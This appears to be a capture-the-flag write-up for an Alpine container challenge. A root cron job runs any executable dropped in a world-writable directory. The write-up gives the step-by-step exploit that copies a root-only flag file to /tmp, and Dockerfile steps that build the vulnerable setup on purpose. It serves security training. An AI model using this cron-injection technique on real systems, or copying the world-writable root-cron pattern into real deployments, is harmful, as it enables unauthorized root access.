# Challenge 9 — Crontab Injection (Alpine)

## Description
Exploit a root cron job that blindly runs any executable dropped in **/var/cleanup**. Use it to read the protected flag at **/root/flag.txt**.

# Solution
1) **Open a shell in the container.**  
   ```bash
   docker exec -it challenge9 bash
   ```

2) **Read the breadcrumb.** The file explains there is a root cron task:  
   ```bash
   cat /home/ctfuser/NOTICE.txt
   ```

3) **Confirm the schedule and the script.**  
   ```bash
   cat /etc/crontabs/root
   cat /usr/local/bin/cleanup.sh
   ```

4) **Drop a payload into `/var/cleanup/`.** Make it executable.  
   ```bash
   cat > /var/cleanup/pwn.sh <<'EOF'
   #!/usr/bin/env bash
   cat /root/flag.txt > /tmp/flag.out
   chmod 644 /tmp/flag.out
   EOF
   chmod +x /var/cleanup/pwn.sh
   ```

5) **Wait up to one minute for cron to run.** Optional: watch the log.  
   ```bash
   tail -f /var/log/cleanup.log
   ```

6) **Read the flag.**  
   ```bash
   cat /tmp/flag.out
   ```

**Why this works:** the cron job runs as **root** and executes anything in a **world‑writable** directory. Your payload reads the flag and drops it in a location you can access.

# Recreating this challenge
Below is a high‑level outline (no build script needed).

1) **Base image:** `alpine:3.20`. Install Bash:  
   ```dockerfile
   RUN apk add --no-cache bash
   ```

2) **User:** create a non‑root player:  
   ```dockerfile
   RUN adduser -D -s /bin/bash ctfuser
   ```

3) **Flag:** copy to `/root/flag.txt` and restrict:  
   ```dockerfile
   COPY flag.txt /root/flag.txt
   RUN chmod 600 /root/flag.txt
   ```

4) **Vulnerable cleanup:** a root script that executes any executable under `/var/cleanup/`:  
   ```dockerfile
   COPY cleanup.sh /usr/local/bin/cleanup.sh
   RUN chmod 755 /usr/local/bin/cleanup.sh        && mkdir -p /var/cleanup /var/log        && chmod 0777 /var/cleanup
   ```

5) **Breadcrumb:** place a short notice for players:  
   ```dockerfile
   COPY NOTICE.txt /home/ctfuser/NOTICE.txt
   RUN chown -R ctfuser:ctfuser /home/ctfuser
   ```

6) **Cron schedule (Alpine style):** write to `/etc/crontabs/root`:  
   ```dockerfile
   RUN echo '* * * * * /bin/bash /usr/local/bin/cleanup.sh >> /var/log/cleanup.log 2>&1' > /etc/crontabs/root
   ```

7) **Keep cron running and keep the container alive:** **BusyBox crond must be pointed at `/etc/crontabs`**.  
   ```dockerfile
   CMD ["/bin/bash","-lc","/usr/sbin/crond -l 8 -c /etc/crontabs; tail -f /dev/null"]
   ```

8) **Build & run (example commands):**
   ```bash
   docker build -t challenge9:latest .
   docker run -d --name challenge9 challenge9:latest      /bin/bash -lc "/usr/sbin/crond -l 8 -c /etc/crontabs; tail -f /dev/null"
   ```

**Notes / fixes:**  
- Alpine’s cron uses `/etc/crontabs/root`, not `/etc/crontab` (Debian style). Use `crond -c /etc/crontabs`.  
- Bash isn’t installed by default on Alpine; install it so the scripts work.  
- The container stays up with `tail -f /dev/null`, so players have time to solve.

---

**Validation:** `solve.sh` is for validation only. Players should solve it manually using the steps above.
